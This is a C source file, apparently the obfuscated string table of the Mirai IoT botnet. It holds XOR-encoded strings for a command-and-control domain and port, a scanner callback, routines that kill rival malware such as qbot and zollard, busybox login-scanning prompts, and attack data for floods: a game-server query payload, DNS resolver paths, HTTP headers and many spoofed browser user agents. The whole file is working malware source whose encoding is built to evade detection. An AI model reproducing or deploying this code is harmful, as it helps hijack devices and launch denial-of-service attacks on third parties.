#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeadbeef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x46\x4D\x4F\x43\x4B\x4C\x22", 11); // cnc.domain
    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);                                    // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\x41\x4C\x41\x0C\x46\x4D\x4F\x43\x4B\x4C\x22", 11); // cnc.domain
    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);                                    // 48101

    add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);

    add_entry(TABLE_KILLER_SAFE, "\x4A\x56\x56\x52\x51\x18\x0D\x0D\x5B\x4D\x57\x56\x57\x0C\x40\x47\x0D\x46\x73\x55\x16\x55\x1B\x75\x45\x7A\x41\x73\x22", 29);
    add_entry(TABLE_KILLER_PROC, "\x0D\x52\x50\x4D\x41\x0D\x22", 7);
    add_entry(TABLE_KILLER_EXE, "\x0D\x47\x5A\x47\x22", 5);
    add_entry(TABLE_KILLER_DELETED, "\x02\x0A\x46\x47\x4E\x47\x56\x47\x46\x0B\x22", 11);
    add_entry(TABLE_KILLER_FD, "\x0D\x44\x46\x22", 4);
    add_entry(TABLE_KILLER_ANIME, "\x0C\x43\x4C\x4B\x4F\x47\x22", 7);
    add_entry(TABLE_KILLER_STATUS, "\x0D\x51\x56\x43\x56\x57\x51\x22", 8);
    add_entry(TABLE_MEM_QBOT, "\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22", 13);
    add_entry(TABLE_MEM_QBOT2, "\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22", 10);
    add_entry(TABLE_MEM_QBOT3, "\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22", 10);
    add_entry(TABLE_MEM_UPX, "\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22", 33);
    add_entry(TABLE_MEM_ZOLLARD, "\x58\x4D\x4E\x4E\x43\x50\x46\x22", 8);
    add_entry(TABLE_MEM_REMAITEN, "\x65\x67\x76\x6E\x6D\x61\x63\x6E\x6B\x72\x22", 11);

    add_entry(TABLE_SCAN_SHELL, "\x51\x4A\x47\x4E\x4E\x22", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x47\x4C\x43\x40\x4E\x47\x22", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x51\x5B\x51\x56\x47\x4F\x22", 7);
    add_entry(TABLE_SCAN_SH, "\x51\x4A\x22", 3);
    add_entry(TABLE_SCAN_QUERY, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x6F\x6B\x70\x63\x6B\x22", 19);
    add_entry(TABLE_SCAN_RESP, "\x6F\x6B\x70\x63\x6B\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22", 24);
    add_entry(TABLE_SCAN_NCORRECT, "\x4C\x41\x4D\x50\x50\x47\x41\x56\x22", 9);
    add_entry(TABLE_SCAN_PS, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22", 22);

    add_entry(TABLE_ATK_VSE, "\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22", 17);
    add_entry(TABLE_ATK_NSERV, "\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22", 12);

    add_entry(TABLE_ATK_KEEP_ALIVE, "\x61\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x02\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22", 23);
    add_entry(TABLE_ATK_ACCEPT, "\x63\x41\x41\x47\x52\x56\x18\x02\x56\x47\x5A\x56\x0D\x4A\x56\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4A\x56\x4F\x4E\x09\x5A\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4F\x4E\x19\x53\x1F\x12\x0C\x1B\x0E\x4B\x4F\x43\x45\x47\x0D\x55\x47\x40\x52\x0E\x08\x0D\x08\x19\x53\x1F\x12\x0C\x1A\x22", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x63\x41\x41\x47\x52\x56\x0F\x6E\x43\x4C\x45\x57\x43\x45\x47\x18\x02\x47\x4C\x0F\x77\x71\x0E\x47\x4C\x19\x53\x1F\x12\x0C\x1A\x22", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x61\x4D\x4C\x56\x47\x4C\x56\x0F\x76\x5B\x52\x47\x18\x02\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x0F\x55\x55\x55\x0F\x44\x4D\x50\x4F\x0F\x57\x50\x4E\x47\x4C\x41\x4D\x46\x47\x46\x22", 48);
    add_entry(TABLE_ATK_CONTENT_TYPE_XML, "\x61\x4D\x4C\x56\x47\x4C\x56\x0F\x76\x5B\x52\x47\x18\x02\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4F\x4E\x22", 30);
    add_entry(TABLE_ATK_SET_COOKIE, "\x51\x47\x56\x61\x4D\x4D\x49\x4B\x47\x0A\x05\x22", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\x50\x47\x44\x50\x47\x51\x4A\x18\x22", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\x4E\x4D\x41\x43\x56\x4B\x4D\x4C\x18\x22", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x51\x47\x56\x0F\x41\x4D\x4D\x49\x4B\x47\x18\x22", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x41\x4D\x4C\x56\x47\x4C\x56\x0F\x4E\x47\x4C\x45\x56\x4A\x18\x22", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x56\x50\x43\x4C\x51\x44\x47\x50\x0F\x47\x4C\x41\x4D\x46\x4B\x4C\x45\x18\x22", 19);
    add_entry(TABLE_ATK_CHUNKED, "\x41\x4A\x57\x4C\x49\x47\x46\x22", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x41\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x22", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x51\x47\x50\x54\x47\x50\x18\x02\x46\x4D\x51\x43\x50\x50\x47\x51\x56\x22", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x51\x47\x50\x54\x47\x50\x18\x02\x41\x4E\x4D\x57\x46\x44\x4E\x43\x50\x47\x0F\x4C\x45\x4B\x4C\x5A\x22", 25);

    add_entry(TABLE_HTTP_ONE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x13\x0C\x12\x0C\x10\x15\x12\x16\x0C\x13\x12\x11\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22", 111);
    add_entry(TABLE_HTTP_TWO, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x4B\x4C\x14\x16\x19\x02\x5A\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x1B\x16\x0C\x12\x0C\x16\x14\x12\x14\x0C\x1A\x13\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x02\x6D\x72\x70\x0D\x1A\x12\x0C\x12\x0C\x16\x13\x15\x12\x0C\x14\x11\x22", 132);
    add_entry(TABLE_HTTP_THREE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x14\x0C\x11\x19\x02\x75\x6D\x75\x14\x16\x19\x02\x50\x54\x18\x10\x16\x0C\x12\x0B\x02\x65\x47\x41\x49\x4D\x0D\x10\x12\x13\x12\x12\x13\x12\x13\x02\x76\x4A\x57\x4C\x46\x47\x50\x40\x4B\x50\x46\x0D\x10\x16\x0C\x16\x0C\x12\x22", 79);
    add_entry(TABLE_HTTP_FOUR, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x4B\x4C\x14\x16\x19\x02\x5A\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x1B\x15\x0C\x12\x0C\x16\x14\x1B\x10\x0C\x1B\x1B\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x02\x6D\x72\x70\x0D\x1A\x11\x0C\x12\x0C\x16\x10\x17\x16\x0C\x14\x10\x22", 132);
    add_entry(TABLE_HTTP_FIVE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x6F\x43\x41\x4B\x4C\x56\x4D\x51\x4A\x19\x02\x6B\x4C\x56\x47\x4E\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x02\x13\x12\x7D\x13\x13\x7D\x14\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x14\x12\x13\x0C\x15\x0C\x15\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x1B\x0C\x13\x0C\x10\x02\x71\x43\x44\x43\x50\x4B\x0D\x14\x12\x13\x0C\x15\x0C\x15\x22", 117);
    add_entry(TABLE_HTTP_SIX, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x4B\x4C\x14\x16\x19\x02\x5A\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x13\x12\x11\x0C\x12\x0C\x12\x0C\x12\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22", 112);
    add_entry(TABLE_HTTP_SEVEN, "\x63\x52\x52\x4E\x47\x76\x74\x14\x0E\x10\x0D\x13\x13\x0C\x13\x22", 16);
    add_entry(TABLE_HTTP_EIGHT, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x4B\x72\x4A\x4D\x4C\x47\x19\x02\x77\x19\x02\x61\x72\x77\x02\x4B\x72\x4A\x4D\x4C\x47\x02\x6D\x71\x02\x16\x7D\x10\x7D\x13\x02\x4E\x4B\x49\x47\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x19\x02\x46\x43\x0F\x46\x49\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x11\x0C\x13\x15\x0C\x1B\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x17\x0C\x12\x0C\x10\x02\x6F\x4D\x40\x4B\x4E\x47\x0D\x1A\x61\x13\x16\x1A\x02\x71\x43\x44\x43\x50\x4B\x0D\x14\x17\x11\x11\x0C\x13\x1A\x0C\x17\x22", 151);
    add_entry(TABLE_HTTP_NINE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x6E\x4B\x4C\x57\x5A\x19\x02\x77\x19\x02\x63\x4C\x46\x50\x4D\x4B\x46\x02\x16\x0C\x12\x0C\x11\x19\x02\x46\x47\x0F\x46\x47\x19\x02\x65\x43\x4E\x43\x5A\x5B\x02\x71\x02\x6B\x6B\x02\x60\x57\x4B\x4E\x46\x0D\x65\x70\x68\x10\x10\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x16\x0C\x11\x12\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x16\x0C\x12\x02\x6F\x4D\x40\x4B\x4E\x47\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x16\x0C\x11\x12\x22", 142);
    add_entry(TABLE_HTTP_TEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x6F\x43\x41\x4B\x4C\x56\x4D\x51\x4A\x19\x02\x6B\x4C\x56\x47\x4E\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x02\x13\x12\x7D\x13\x17\x7D\x13\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x14\x12\x17\x0C\x13\x0C\x13\x17\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x13\x11\x0C\x12\x0C\x11\x02\x71\x43\x44\x43\x50\x4B\x0D\x14\x12\x17\x0C\x13\x0C\x13\x17\x22", 120);
    add_entry(TABLE_HTTP_ELEVEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x6C\x4B\x4C\x56\x47\x4C\x46\x4D\x02\x75\x4B\x4B\x77\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x14\x0C\x11\x12\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x6C\x7A\x0D\x11\x0C\x12\x0C\x16\x0C\x10\x0C\x13\x10\x02\x6C\x4B\x4C\x56\x47\x4C\x46\x4D\x60\x50\x4D\x55\x51\x47\x50\x0D\x16\x0C\x11\x0C\x13\x0C\x13\x13\x10\x14\x16\x0C\x77\x71\x22", 112);
    add_entry(TABLE_HTTP_TWELVE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x72\x4E\x43\x5B\x71\x56\x43\x56\x4B\x4D\x4C\x02\x16\x02\x11\x0C\x13\x13\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x15\x11\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x22", 72);
    add_entry(TABLE_HTTP_THIRTEEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x6C\x4B\x4C\x56\x47\x4C\x46\x4D\x02\x11\x66\x71\x19\x02\x77\x19\x02\x19\x02\x47\x4C\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x13\x0C\x15\x16\x13\x10\x0C\x67\x77\x22", 54);
    add_entry(TABLE_HTTP_FOURTEEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x72\x4A\x4D\x4C\x47\x02\x13\x12\x0C\x12\x19\x02\x63\x4C\x46\x50\x4D\x4B\x46\x02\x16\x0C\x10\x0C\x13\x19\x02\x7A\x40\x4D\x5A\x19\x02\x7A\x40\x4D\x5A\x02\x6D\x4C\x47\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x16\x14\x0C\x12\x0C\x10\x16\x1A\x14\x0C\x12\x02\x6F\x4D\x40\x4B\x4E\x47\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x02\x67\x46\x45\x47\x0D\x13\x11\x0C\x13\x12\x17\x1A\x14\x22", 157);
    add_entry(TABLE_HTTP_FIFTEEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x19\x02\x77\x19\x02\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x14\x0C\x13\x19\x02\x47\x4C\x0F\x77\x71\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x16\x0C\x10\x12\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x13\x13\x0C\x12\x0C\x14\x15\x10\x0C\x10\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x16\x0C\x10\x12\x22", 119);
    add_entry(TABLE_HTTP_SIXTEEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x19\x02\x77\x19\x02\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x14\x0C\x13\x19\x02\x47\x4C\x0F\x77\x71\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x16\x0C\x13\x12\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x1A\x0C\x12\x0C\x17\x17\x10\x0C\x10\x13\x17\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x16\x0C\x13\x12\x02\x61\x4A\x50\x4D\x4F\x47\x72\x4E\x57\x51\x0D\x13\x0C\x17\x0C\x13\x0C\x13\x22", 139);
    add_entry(TABLE_HTTP_SEVENTEEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x7A\x13\x13\x19\x02\x77\x40\x57\x4C\x56\x57\x19\x02\x6E\x4B\x4C\x57\x5A\x02\x5A\x1A\x14\x7D\x14\x16\x19\x02\x50\x54\x18\x15\x12\x0C\x12\x0B\x02\x65\x47\x41\x49\x4D\x0D\x10\x12\x13\x12\x12\x13\x12\x13\x02\x64\x4B\x50\x47\x44\x4D\x5A\x0D\x15\x12\x0C\x12\x22", 77);
    add_entry(TABLE_HTTP_EIGHTEEN, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x7A\x13\x13\x19\x02\x77\x40\x57\x4C\x56\x57\x19\x02\x6E\x4B\x4C\x57\x5A\x02\x5A\x1A\x14\x7D\x14\x16\x19\x02\x50\x54\x18\x14\x1B\x0C\x12\x0B\x02\x65\x47\x41\x49\x4D\x0D\x10\x12\x13\x12\x12\x13\x12\x13\x02\x64\x4B\x50\x47\x44\x4D\x5A\x0D\x14\x1B\x0C\x12\x22", 77);
    add_entry(TABLE_HTTP_NINETEEN, "\x6D\x52\x47\x50\x43\x0D\x1B\x0C\x1A\x12\x02\x0A\x6F\x43\x41\x4B\x4C\x56\x4D\x51\x4A\x19\x02\x6B\x4C\x56\x47\x4E\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x02\x13\x12\x0C\x14\x0C\x1A\x19\x02\x77\x19\x02\x44\x50\x0B\x02\x72\x50\x47\x51\x56\x4D\x0D\x10\x0C\x1B\x0C\x13\x14\x1A\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x13\x13\x0C\x17\x10\x22", 82);
    add_entry(TABLE_HTTP_TWENTY, "\x6D\x52\x47\x50\x43\x0D\x13\x12\x0C\x14\x13\x02\x0A\x68\x10\x6F\x67\x0D\x6F\x6B\x66\x72\x19\x02\x6D\x52\x47\x50\x43\x02\x6F\x4B\x4C\x4B\x0D\x17\x0C\x13\x0C\x10\x13\x10\x13\x1B\x0D\x13\x1B\x0C\x1B\x1B\x1B\x19\x02\x47\x4C\x0F\x77\x71\x19\x02\x50\x54\x18\x13\x0C\x1B\x0C\x11\x43\x17\x0B\x02\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x16\x0C\x17\x02\x72\x50\x47\x51\x56\x4D\x0D\x10\x0C\x14\x0C\x11\x12\x22", 99);
    add_entry(TABLE_HTTP_TWENTY_ONE, "\x72\x6D\x6E\x63\x70\x6B\x71\x0D\x14\x0C\x12\x13\x0A\x60\x70\x67\x75\x02\x11\x0C\x13\x0C\x17\x19\x77\x19\x47\x4C\x0F\x57\x51\x19\x6E\x65\x19\x6E\x7A\x10\x14\x17\x19\x72\x6D\x6E\x63\x70\x6B\x71\x0D\x14\x0C\x12\x13\x0D\x75\x63\x72\x19\x0B\x6F\x6F\x72\x0D\x10\x0C\x12\x02\x52\x50\x4D\x44\x4B\x4E\x47\x0D\x6F\x6B\x66\x72\x0F\x10\x12\x13\x02\x61\x4D\x4C\x44\x4B\x45\x57\x50\x43\x56\x4B\x4D\x4C\x02\x0D\x61\x6E\x66\x61\x0F\x13\x0C\x13\x22", 108);
    add_entry(TABLE_HTTP_TWENTY_TWO, "\x72\x5B\x56\x4A\x4D\x4C\x0F\x57\x50\x4E\x4E\x4B\x40\x0D\x10\x0C\x17\x22", 18);
    add_entry(TABLE_HTTP_TWENTY_THREE, "\x71\x63\x6F\x71\x77\x6C\x65\x0F\x71\x65\x6A\x0F\x67\x10\x17\x12\x0D\x13\x0C\x12\x02\x72\x50\x4D\x44\x4B\x4E\x47\x0D\x6F\x6B\x66\x72\x0F\x10\x0C\x12\x02\x61\x4D\x4C\x44\x4B\x45\x57\x50\x43\x56\x4B\x4D\x4C\x0D\x61\x6E\x66\x61\x0F\x13\x0C\x13\x02\x77\x72\x0C\x60\x50\x4D\x55\x51\x47\x50\x0D\x14\x0C\x10\x0C\x11\x0C\x11\x0C\x41\x0C\x13\x0C\x13\x12\x13\x02\x0A\x65\x77\x6B\x0B\x02\x6F\x6F\x72\x0D\x10\x0C\x12\x02\x0A\x41\x4D\x4F\x52\x43\x56\x4B\x40\x4E\x47\x19\x02\x65\x4D\x4D\x45\x4E\x47\x40\x4D\x56\x0F\x6F\x4D\x40\x4B\x4E\x47\x0D\x10\x0C\x13\x19\x02\x4A\x56\x56\x52\x18\x0D\x0D\x55\x55\x55\x0C\x45\x4D\x4D\x45\x4E\x47\x0C\x41\x4D\x4F\x0D\x40\x4D\x56\x0C\x4A\x56\x4F\x4E\x0B\x22", 169);
    add_entry(TABLE_HTTP_TWENTY_FOUR, "\x71\x4B\x56\x47\x60\x43\x50\x0D\x11\x0C\x11\x0C\x1A\x02\x0A\x60\x4D\x4D\x49\x4F\x43\x50\x49\x02\x71\x47\x50\x54\x47\x50\x19\x02\x4A\x56\x56\x52\x18\x0D\x0D\x51\x4B\x56\x47\x40\x43\x50\x0C\x4D\x50\x45\x0D\x0B\x22", 53);
    add_entry(TABLE_HTTP_TWENTY_FIVE, "\x75\x11\x61\x7D\x74\x43\x4E\x4B\x46\x43\x56\x4D\x50\x0D\x13\x0C\x11\x12\x17\x0C\x10\x0C\x13\x10\x02\x4E\x4B\x40\x55\x55\x55\x0F\x52\x47\x50\x4E\x0D\x17\x0C\x14\x16\x22", 42);
    add_entry(TABLE_HTTP_TWENTY_SIX, "\x75\x11\x61\x7D\x74\x43\x4E\x4B\x46\x43\x56\x4D\x50\x0D\x13\x0C\x14\x17\x16\x22", 20);
    add_entry(TABLE_HTTP_TWENTY_SEVEN, "\x55\x11\x4F\x0D\x12\x0C\x17\x0C\x13\x22", 10);
    add_entry(TABLE_HTTP_TWENTY_EIGHT, "\x75\x66\x65\x7D\x74\x43\x4E\x4B\x46\x43\x56\x4D\x50\x0D\x13\x0C\x14\x0C\x10\x22", 20);
    add_entry(TABLE_HTTP_TWENTY_NINE, "\x75\x47\x40\x02\x66\x4D\x55\x4C\x4E\x4D\x43\x46\x47\x50\x0D\x14\x0C\x1B\x22", 19);
    add_entry(TABLE_HTTP_THIRTY, "\x65\x4D\x4D\x45\x4E\x47\x40\x4D\x56\x0D\x10\x0C\x13\x02\x0A\x02\x4A\x56\x56\x52\x18\x0D\x0D\x55\x55\x55\x0C\x45\x4D\x4D\x45\x4E\x47\x40\x4D\x56\x0C\x41\x4D\x4F\x0D\x40\x4D\x56\x0C\x4A\x56\x4F\x4E\x0B\x22", 51);
    add_entry(TABLE_HTTP_THIRTY_ONE, "\x65\x4D\x4D\x45\x4E\x47\x40\x4D\x56\x0D\x10\x0C\x13\x02\x0A\x09\x4A\x56\x56\x52\x18\x0D\x0D\x55\x55\x55\x0C\x45\x4D\x4D\x45\x4E\x47\x0C\x41\x4D\x4F\x0D\x40\x4D\x56\x0C\x4A\x56\x4F\x4E\x0B\x22", 48);
    add_entry(TABLE_HTTP_THIRTY_TWO, "\x4B\x61\x61\x50\x43\x55\x4E\x47\x50\x02\x0A\x4A\x56\x56\x52\x18\x0D\x0D\x55\x55\x55\x0C\x4B\x41\x41\x47\x4C\x56\x47\x50\x0C\x4C\x47\x56\x0D\x40\x4D\x56\x0C\x4A\x56\x4F\x0B\x22", 44);
    add_entry(TABLE_HTTP_THIRTY_THREE, "\x4B\x76\x57\x4C\x47\x51\x0D\x1B\x0C\x12\x0C\x11\x02\x0A\x6F\x43\x41\x4B\x4C\x56\x4D\x51\x4A\x19\x02\x77\x19\x02\x6B\x4C\x56\x47\x4E\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x02\x13\x12\x7D\x14\x7D\x10\x19\x02\x47\x4C\x0F\x41\x43\x0B\x22", 58);
    add_entry(TABLE_HTTP_THIRTY_FOUR, "\x68\x43\x54\x43\x0D\x13\x0C\x16\x0C\x13\x7D\x12\x16\x22", 14);
    add_entry(TABLE_HTTP_THIRTY_FIVE, "\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x4B\x72\x43\x46\x19\x02\x77\x19\x02\x61\x72\x77\x02\x6D\x71\x02\x16\x7D\x11\x02\x4E\x4B\x49\x47\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x19\x02\x47\x4C\x0F\x57\x51\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x11\x0C\x13\x15\x0C\x1B\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x17\x0C\x12\x0C\x10\x02\x6F\x4D\x40\x4B\x4E\x47\x0D\x1A\x64\x13\x1B\x12\x02\x71\x43\x44\x43\x50\x4B\x0D\x14\x17\x11\x11\x0C\x13\x1A\x0C\x17\x22", 142);
